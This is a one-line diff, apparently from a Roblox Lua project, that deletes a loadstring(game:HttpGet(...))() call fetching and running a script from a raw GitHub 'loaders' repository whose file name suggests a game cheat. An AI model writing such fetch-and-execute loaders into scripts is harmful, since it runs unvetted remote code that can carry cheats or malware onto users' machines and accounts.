@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/draw-spells-magic-arena-spam7-5mxz111zo6vjkc.lua"))()
